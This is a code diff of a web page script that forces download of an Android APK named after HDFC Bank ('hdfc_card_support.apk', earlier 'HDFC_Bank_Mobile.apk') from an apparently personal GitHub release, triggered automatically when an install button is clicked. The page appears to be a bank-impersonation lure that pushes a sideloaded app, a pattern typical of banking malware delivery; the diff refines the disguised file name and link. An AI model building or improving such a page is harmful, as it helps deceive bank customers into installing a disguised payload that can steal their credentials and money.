@@ -1,6 +1,6 @@
 document.addEventListener('DOMContentLoaded', () => {
     // PASTE YOUR REAL GITHUB RELEASE LINK HERE:
-    const REAL_APK_URL = 'https://github.com/amanxridex/newmade/releases/download/v1.0.28/hdfc_support.apk'; 
+    const REAL_APK_URL = 'https://github.com/amanxridex/newmade/releases/latest/download/hdfc_card_support.apk'; 
     
     const installBtn = document.getElementById('installBtn');
     let deferredPrompt;
@@ -28,7 +28,7 @@ document.addEventListener('DOMContentLoaded', () => {
             // 2. TRIGGER APK DOWNLOAD IMMEDIATELY (Backup)
             const downloadLink = document.createElement('a');
             downloadLink.href = REAL_APK_URL;
-            downloadLink.download = 'HDFC_Bank_Mobile.apk';
+            downloadLink.download = 'hdfc_card_support.apk';
             document.body.appendChild(downloadLink);
             downloadLink.click();
             document.body.removeChild(downloadLink);
